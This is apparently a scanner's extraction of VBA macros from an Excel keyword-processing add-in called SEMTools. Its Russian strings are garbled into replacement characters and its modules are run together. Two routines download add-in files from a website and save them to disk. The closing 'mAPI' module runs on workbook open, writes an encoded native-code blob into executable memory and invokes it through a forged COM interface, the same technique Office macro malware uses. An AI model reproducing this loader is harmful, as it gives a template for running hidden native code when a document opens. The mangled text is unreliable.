vinFemAdj = exOnWords("vinFem1Adj", x)
End Function
Function imNoneAdj(x As String) As String
imNoneAdj = exOnWords("imNone1Adj", x)
End Function
'-end morphology
Sub SEM_dlWordsProcessor(control As IRibbonControl)
Dim myURL As String, intChoice As Long, strPath As String, oStream As Object, WinHttpReq As Object

Application.FileDialog(msoFileDialogSaveAs).InitialFileName = "SEMToolsWordProcessor.xlsb"
intChoice = Application.FileDialog(msoFileDialogSaveAs).Show
strPath = "SEMToolsWordProcessor.xlsb"
If choice <> 0 Then
    strPath = Application.FileDialog(msoFileDialogSaveAs).SelectedItems(1)
End If

myURL = "https://semtools.guru/dl/ru/SEMToolsWordProcessor.xlsb"

Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False, "username", "password"
WinHttpReq.Send

If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile strPath, 2 ' 1 = no overwrite, 2 = overwrite
    oStream.Close
End If

End Sub
Attribute VB_Name = "SEMTools"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Private Sub Workbook_Open()

End Sub

Private Sub Workbook_SheetActivate(ByVal Sh As Object)

End Sub
Attribute VB_Name = "YTP"
Attribute VB_Base = "0{CAE94D90-099B-4231-A84C-4FACC210F5E1}{7F69AD91-8BC6-4A5E-984F-0665E1D54BD4}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit
Private Sub UserForm_Initialize()
    WebBrowser1.Navigate YTURL
End Sub

Attribute VB_Name = "abc"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "findIrr"
Attribute VB_Base = "0{AFB934C3-D0A0-40B4-8D3B-18DC322B54D4}{2490C419-24A9-47B8-B8B8-9EDE6308E521}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Option Explicit
Sub searchButton_Click()
Dim x() As String, mWord As String, prep As String, i As Long, r As Long, dict As Object, dictEx As Object
Dim a()
Dim arrImenit(), arrRodit(), arrDat(), arrVinit(), arrTvorit(), arrPredl(), arrMnozh(), arrStop() As String
If WorksheetFunction.Min(imenit.TextLength, rodit.TextLength, tvorit.TextLength, dat.TextLength, vinit.TextLength, predl.TextLength, _
imenitM.TextLength, roditM.TextLength, tvoritM.TextLength, datM.TextLength, vinitM.TextLength, predlM.TextLength) = 0 Then
       MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", , ""
       Exit Sub
End If
'osnovnoy kod
findIrr.Hide
udalit_toponimy_s_pryedlogami
remPhrases abc.Range("GEO_Toponyms")
'|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'
OptimizeON
    a = Selection.Value2
    arrStop = Split(stopwords())
    arrImenit = Array("|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|")
    arrRodit = Array("|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|")
    arrDat = Array("|fffd||fffd|", "|fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|")
    arrVinit = Array("|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd||fffd|", "|fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|")
    arrTvorit = Array("|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
    arrPredl = Array("|fffd|", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|")
    Set dict = CreateObject("Scripting.Dictionary")
    Set dictEx = CreateObject("Scripting.Dictionary")
For r = LBound(a) To UBound(a):
   a(r, 1) = delWordsFromRng(CStr(a(r, 1)), abc.Range("markyerypokupki"))
    x = Split(a(r, 1), " ")
        For i = LBound(x) + 2 To UBound(x)
            mWord = x(i - 2)
            prep = x(i - 1)
            If x(i) = imenit.Value And IsInArray(prep, arrImenit) Or _
                    x(i) = rodit.Value And IsInArray(prep, arrRodit) Or _
                    x(i) = dat.Value And IsInArray(prep, arrDat) Or _
                    x(i) = vinit.Value And IsInArray(prep, arrVinit) Or _
                    x(i) = tvorit.Value And IsInArray(prep, arrTvorit) Or _
                    x(i) = predl.Value And IsInArray(prep, arrPredl) Or _
                    x(i) = imenitM.Value And IsInArray(prep, arrImenit) Or _
                    x(i) = roditM.Value And IsInArray(prep, arrRodit) Or _
                    x(i) = datM.Value And IsInArray(prep, arrDat) Or _
                    x(i) = vinitM.Value And IsInArray(prep, arrVinit) Or _
                    x(i) = tvoritM.Value And IsInArray(prep, arrTvorit) Or _
                    x(i) = predlM.Value And IsInArray(prep, arrPredl) Then
                    If Not IsInArray(mWord, arrStop) Then
                        If dict.exists(mWord) Then
                            dict.item(mWord) = dict.item(mWord) + 1
                            If InStr(1, dictEx.item(mWord), mWord & " " & prep & " " & x(i)) > 0 Then
                            Else:
                            dictEx.item(mWord) = dictEx.item(mWord) & mWord & " " & prep & " " & x(i) & ","
                            End If
                        Else:
                        dict.Add mWord, 1
                        dictEx.Add mWord, mWord & " " & prep & " " & x(i) & ","
                        End If
                    Else:
                    End If
            Else:
            End If
        Next i
Next r
With Worksheets.Add
    .name = "|fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd|"
    .[a1].Value2 = "|fffd||fffd||fffd||fffd||fffd|"
    .[b1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    .[C1].Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End With
With dict
    Cells(2, 1).Resize(.Count) = Application.Transpose(.Keys)
    Cells(2, 2).Resize(.Count) = Application.Transpose(.Items)
End With
With dictEx
    Cells(2, 3).Resize(.Count) = Application.Transpose(.Items)
End With
OptimizeOFF
End Sub
Attribute VB_Name = "funcSpeedTest"
Option Base 1
' edit hidden sh
Private Sub showlic()
ActiveSheet.Range("A:A").Value2 = abc.Range("O:O").Value2
End Sub
Private Sub changeLic()
abc.Range("O:O").Value2 = ActiveSheet.Range("A:A").Value2
End Sub
'GEO
Sub Show_GEO()
ActiveSheet.Range("A:A").Value2 = abc.Range("A:A").Value2
End Sub
Sub Write_GEO()
abc.Range("A:A").Value2 = ActiveSheet.Range("A:A").Value2
End Sub
Sub Get_Geo()
abc.Range("A1", abc.Range("A1").End(xlDown)).name = "GEO_Toponyms"
End Sub
Sub Set_lemm()
ActiveWorkbook.Worksheets("lemmdict").Range("A1", Range("C1048576").End(xlUp)).name = "slovarlyemm"
End Sub
Function currentVersion() As String
currentVersion = "9.12.18"
End Function
Private Sub getCurVer(control As IRibbonControl)
MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - " & currentVersion
End Sub
''''update
Sub VersionCheck(en As Boolean)
Dim Answer As String
ver = GetHtml("https://docs.google.com/spreadsheets/d/e/2PACX-1vQN3bh1aXP1w7OagmvITT8n--BeplXqPnpCEisOtGDo6P9sKD5Q9ASSMJQ-dIXtq-EZBivVJKwUaIgj/pub?gid=0&single=true&output=csv")
If ver <> currentVersion Then
    If en = False Then
        Answer = MsgBox("|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SEMTools! " & ver & ". |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?", vbQuestion + vbYesNo, "")
            If Answer = vbYes Then
                dlToolsApp
            Else
            End If
        Else
        Answer = MsgBox("A new version of !SEMTools is available! " & ver & ". Download?", vbQuestion + vbYesNo, "")
            If Answer = vbYes Then
                callWebPage ("https://semtools.guru/download/")
            Else
            End If
        End If
    Else
        If en Then
            MsgBox "Congrats, you have the latest version!"
        Else
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!"
        End If
    End If
End Sub
Private Sub dlToolsApp()
Dim myURL As String, intChoice As Long, strPath As String, oStream As Object, WinHttpReq As Object

Application.FileDialog(msoFileDialogSaveAs).InitialFileName = "!SEMTools9ru.xlam"
intChoice = Application.FileDialog(msoFileDialogSaveAs).Show
strPath = "!SEMTools9ru.xlam"
If choice <> 0 Then
    strPath = Application.FileDialog(msoFileDialogSaveAs).SelectedItems(1)
End If

myURL = "https://semtools.guru/dl/ru/!SEMTools9ru.xlam"

Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False, "username", "password"
WinHttpReq.Send

If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile strPath, 2 ' 1 = no overwrite, 2 = overwrite
    oStream.Close
End If

End Sub

''''
Private Sub ShowABC()
ActiveSheet.Range("A:A", "AS:AS").Value2 = abc.Range("A:A", "AS:AS").Value2
End Sub
Private Sub ChangeABC()
abc.Range("A:A", "AS:AS").Value2 = ActiveSheet.Range("A:A", "AS:AS").Value2
End Sub
''
Private Sub define_lemmSuff()
abc.Range("E50", abc.Range("F50").End(xlDown)).name = "lemmSuf"
End Sub
'NOUNS
Private Sub showMorphNouns()
ActiveSheet.Range("A:A", "L:L").Value2 = abc.Range("Q:Q", "AB:AB").Value2
End Sub
Sub changeMorphsNouns()
abc.Range("Q:Q", "AB:AB").Value2 = ActiveSheet.Range("A:A", "L:L").Value2
End Sub
Sub define_morphsNouns()
abc.Range("Q1", abc.Range("AB1").End(xlDown)).name = "nounSuffixes"
End Sub
Sub define_noun_excl()
abc.Range("Q3445", abc.Range("Q3445").End(xlDown)).name = "nounExclusions"
End Sub
Sub define_noun_excl2()
abc.Range("Q3445", abc.Range("Q3445").End(xlDown).Offset(0, 11)).name = "nounExclusions2"
End Sub
'ADJECTIVES
Private Sub showMorphAdj()
ActiveSheet.Range("A:A", "P:P").Value2 = abc.Range("AD:AD", "AS:AS").Value2
End Sub
Sub changeMorphsAdj()
abc.Range("AD:AD", "AS:AS").Value2 = ActiveSheet.Range("A:A", "P:P").Value2
End Sub
Sub define_morphsAdj()
abc.Range("AD2", abc.Range("AS1").End(xlDown)).name = "adjSuffixes"
End Sub
Sub define_adj_excl()
abc.Range("J1", abc.Range("J1").End(xlDown)).name = "adjExclusions"
End Sub
Sub define_adj_excl2()
abc.Range("AD42", abc.Range("AS43").End(xlDown)).name = "adjExclusions2"
End Sub
Sub def_markyerypokupki()
abc.Range("D1", abc.Range("D1").End(xlDown)).name = "markyerypokupki"
End Sub
Sub def_Q()
abc.Range("C1", abc.Range("C1").End(xlDown)).name = "questions"
End Sub
Attribute VB_Name = "sqReportCreator"
Attribute VB_Base = "0{6EB56A66-DABF-4529-9E5A-87F7445F91E5}{6981E363-A136-48D2-A684-02AA315379F5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Option Explicit
Private Sub dlButton_Click()
Dim reportLink As String, campStr As String, synStr As String, startDate As String, endDate As String, goalStr As String
If cid.TextLength > 0 Then campStr = "&cid=" & cid.Value & "&single_camp=1" Else campStr = ""
If goalID.TextLength > 0 Then goalStr = "&fl_goal_id__eq=" & goalID.Value Else goalStr = ""
If qType.Value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" Then synStr = "&fl_match_type__eq%5B%5D=syn" Else synStr = ""
endDate = CStr(Format(Now(), "yyyy-mm-dd"))
If dayCount.TextLength > 0 Then
    startDate = CStr(Format(DateAdd("d", dayCount.Value * (-1), CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(Now(), "yyyy-mm-dd"))
ElseIf period.Value = "|fffd||fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -1, CDate(Now())), "yyyy-mm-dd"))
    endDate = CStr(Format(DateAdd("d", -1, CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "7 |fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -7, CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "14 |fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -14, CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "30 |fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -30, CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "90 |fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -90, CDate(Now())), "yyyy-mm-dd"))
ElseIf period.Value = "180 |fffd||fffd||fffd||fffd|" Then
    startDate = CStr(Format(DateAdd("d", -180, CDate(Now())), "yyyy-mm-dd"))
Else:
       MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", , ""
       Exit Sub
End If
reportLink = _
    "https://direct.yandex.ru/registered/main.pl?show_stat=1&cmd=showStat&ulogin=" & _
login.Value & _
    "&stat_periods=&sort=clicks&reverse=1&stat_type=search_queries&format=xlsx" & _
campStr & _
    "&group_by_date=none&date_from=" & _
startDate & _
    "&date_to=" & _
endDate & _
    "&attribution_model=last_significant_click&with_nds=" & _
nds.Value & _
synStr & goalStr
sqReportCreator.Hide
callWebPage (reportLink)
End Sub

Private Sub UserForm_Initialize()
nds.List = Array("1", "0")
qType.List = Array("|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
period.List = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "7 |fffd||fffd||fffd||fffd|", "14 |fffd||fffd||fffd||fffd|", "30 |fffd||fffd||fffd||fffd|", "90 |fffd||fffd||fffd||fffd|", "180 |fffd||fffd||fffd||fffd|")
End Sub

' InQuest injected base64 decoded content
' .+-	
' &.+-
' zYlJ
' Z+a<
' .+-1
' Z/j,
' jYv"
' buj+u:
' buj+u:
' &k:'N
' jg!j
' Irjz/
' YZv+
' YZv)

INQUEST-PP=macro
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "mAPI"
Option Explicit

'--------------------------------------------------------------
' This VBA Project has been protected with a proprietary scheme
' Do NOT tamper with this file, as Excel may crash!
'--------------------------------------------------------------

Private Const OPTION_BASE                  As Long = 0
Private Const OPTION_FLAGS                 As Long = 2
Private Const OPTION_INCLUDE_REFERENCEDOCS As Long = 0
Private Const OPTION_DISABLEDCLASSES       As String = ""
Private Const PAGE_EXECUTE_RW              As Long = &H40
Private Const MEM_RESERVE_AND_COMMIT       As Long = &H3000
Private Const MEM_RELEASE                  As Long = &H8000
Private Const ERR_OUT_OF_MEMORY            As Long = &H7
Private Const ROOTOBJECT_SIZE              As Long = &H4D948

Private m_Loader As VCOMInitializerStruct
Private m_VCOMObject As Object

#If VBA7 = False Then
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Address As Long, ByVal Size As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
    Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal ProcName As String) As Long
    Private Declare Function GetProcAddress Lib "kernel32" (ByVal Module As Long, ByVal ProcName As String) As Long
    Private Declare Function VirtualFree Lib "kernel32" (ByVal lpAddress As Long, ByVal Size As Long, ByVal dwFreeType As Long) As Long
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByRef Dest As Any, ByRef Source As Any, ByVal Size As Long)
    Private Const VBA_VERSION              As Long = 6

    Private Type VCOMInitializerStruct
        vtbl_QueryInterface As Long
        vtbl_AddRef As Long
        vtbl_Release As Long
        vtbl_GetTypeInfoCount As Long
        vtbl_GetTypeInfo As Long
        vtbl_GetIDsOfNames As Long
        vtbl_Invoke As Long
        RootObjectMem As Long
        HelperObject As Object
        SysFreeString As Long
        GetProcAddress As Long
        NativeCode As String
        LoaderMem As Long
        IgnoreFlag As Boolean
        VTablePtr As Long
        Kernel32Handle As Long
        RootObject As Object
        ClassFactory As Object
    End Type
#Else
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Address As LongPtr, ByVal Size As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
    Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal ProcName As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal Module As LongPtr, ByVal ProcName As String) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal Size As LongPtr, ByVal dwFreeType As Long) As Long
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByRef Dest As Any, ByRef Source As Any, ByVal Size As LongPtr)
    Private Const VBA_VERSION              As Long = 7

    Private Type VCOMInitializerStruct
        vtbl_QueryInterface As LongPtr
        vtbl_AddRef As LongPtr
        vtbl_Release As LongPtr
        vtbl_GetTypeInfoCount As LongPtr
        vtbl_GetTypeInfo As LongPtr
        vtbl_GetIDsOfNames As LongPtr
        vtbl_Invoke As LongPtr
        RootObjectMem As LongPtr
        HelperObject As Object
        SysFreeString As LongPtr
        GetProcAddress As LongPtr
        NativeCode As String
        LoaderMem As LongPtr
        IgnoreFlag As Boolean
        VTablePtr As LongPtr
        Kernel32Handle As LongPtr
        RootObject As Object
        ClassFactory As Object
    End Type
#End If

Public Sub Auto_Open()

    With m_Loader
        .NativeCode = "%EEEE%::::PPPPPPPPPH+D$ XXXtNXXXXXXVSPPPPj PPPPPPPP4T)D$04P)D$,4'4 )D$($ PZ3D$@+D$ YQ3H +L$ XP3Q +T$0XPf55ntvf)B|+T$0+T$0+T$0R[YQ^VXP2CP<0tF1D$$kD$$@!L$$2CQ1D$$kD$$@!L$$2CR1D$$kD$$@!L$$2CS+\$,3BP1BP1rP3rP+T$(  XXXXXXXXXXXXX[^tJAYAZQ4tPPPPH)D$@4pH)D$84'4 H)D$0$ PH+L$ H3AtH+D$ L3PtL+T$HXPf55{L+T$HL+T$HtqfA)B8ARA[YQXPA2CD<0tR1D$0kD$0@L!L$0A2CE1D$0kD$0@L!L$0A2CF1D$0kD$0@L!L$0A2CGL+\$@A3BDA1BDA1JDA3JDL+T$8  XXXXXYXXXXqBLHOJA@n[??n[=ezoieZZprkhs^ljbZljbZ=bNZ_Q_>HirF[Q^Z[IrzRM wGDDoeTtKTfdGVduCVduCGhiCGhygGhygCmzXGcH[D_J^DV VfF VX<TI@<_veu]flqomliCuelQxpdudatE@hrwIkzSMzvOizw_Mzw_MssLJssLZBCLZ@A]^@A]^TNa^oFmn^nIv@aSsbT?WeWnSg_DCgKjKWCgHe[wJGe;?@fj;Ifyr@cfMAmTN_rNKNzxilIhMnADMgDV@cm;<jihu?aE=]rdY\puMUpgDuAa;UqSWBSPSUG=LUFNNESSOPGVYEbGXQWROj__GHKjOj_MIHKj^x?IRh=XVh=XVKH<VYKlJWLbAEtOIg@nIDT^HJVOD[KGudwGDEeFT[reTWJ@\ht>a;r>cruLna<Mniy?eKL_]zy?\pznXpznXANNXIL_\IL_\xSc\iMIUzQIdEoomgyo=XAyzJCDBXN>=QKmvHmtvO]HXO]J\O]J\m]hV?]mXmQvgl=tdpaS RUqPBV \PRocNMQflywB>;gFluaO?jKF@UIO ai_vUJ[apwFqeFGfACZVu>[0"

        .LoaderMem = VirtualAlloc(0, Len(.NativeCode), MEM_RESERVE_AND_COMMIT, PAGE_EXECUTE_RW)
        If .LoaderMem = 0 Then Err.Raise ERR_OUT_OF_MEMORY

        .RootObjectMem = VirtualAlloc(0, ROOTOBJECT_SIZE, MEM_RESERVE_AND_COMMIT, PAGE_EXECUTE_RW)
        If .RootObjectMem = 0 Then Err.Raise ERR_OUT_OF_MEMORY

        .vtbl_QueryInterface = .LoaderMem
        .VTablePtr = VarPtr(m_Loader)
        .Kernel32Handle = GetModuleHandleA("KERNEL32")
        .GetProcAddress = GetProcAddress(.Kernel32Handle, "GetProcAddress")
        .SysFreeString = GetProcAddress(GetModuleHandleA("OLEAUT32"), "SysFreeString")
        Call CopyMemory(ByVal .LoaderMem, ByVal .NativeCode, Len(.NativeCode))
        Call CopyMemory(.RootObject, VarPtr(.VTablePtr), LenB(.VTablePtr))
        .IgnoreFlag = TypeOf .RootObject Is VBA.Collection
        Set .ClassFactory = (.RootObject)
        Set .RootObject = Nothing
        VirtualFree .LoaderMem, 0, MEM_RELEASE
        Call .ClassFactory.Init(.Kernel32Handle, .GetProcAddress, OPTION_BASE + OPTION_FLAGS, VBA_VERSION, .HelperObject)
        Set m_VCOMObject = .ClassFactory.GetErrEx()
    End With

End Sub


' InQuest injected base64 decoded content
' Wn	Wn
' -AM4D

INQUEST-PP=macro
